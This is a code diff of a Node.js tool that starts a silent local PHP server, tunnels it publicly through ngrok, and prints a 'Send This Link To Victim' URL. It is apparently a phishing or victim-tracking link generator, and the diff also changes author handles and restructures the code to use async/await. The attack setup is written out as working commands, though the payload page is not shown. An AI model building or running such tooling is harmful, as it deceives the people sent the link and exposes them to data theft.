@@ -25,22 +25,22 @@ console.log(c.rainbow("[!] Version V2"))
 console.log(c.rainbow("[:———————————————————:]"))
 console.log(style.bgBlue("[Coder] Fajar Firdaus"))
 console.log(style.bgBlue("[Fb] Fajar Firdaus"))
-console.log(style.bgBlue("[IG] fajar_firdaus_7"))
-console.log(style.bgBlue("[YT] iTech7732"))
+console.log(style.bgBlue("[IG] @kernel024"))
+console.log(style.bgBlue("[Twitter] @kernel024"))
 console.log(c.rainbow("[:———————————————————:]"))
 
 // Create user input interface
 
+async function run(){
+
 // Create php local server
-cmd.exec("php -S 127.0.0.1:3200 > /dev/null 2>&1 & ");
+await cmd.exec("php -S 127.0.0.1:3200 > /dev/null 2>&1 & ");
 
 // Make online php server by port forwarding
-cmd.exec("./ngrok http 3200 > /dev/null 2>&1 &");
+await cmd.exec("./ngrok http 3200 > /dev/null 2>&1 &");
 
 console.log(style.bgBlue("[/] Please Wait... :)"))
 
-
-setTimeout(() => {
 
 // Tell user if server already start
 console.log(c.blue("[ Send This Link To Victim ] > " + cmd.exec("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io'")));
@@ -65,4 +65,7 @@ var js = JSON.parse(body);
 
 });
 });
-}, 4000);
+
+}
+
+run();
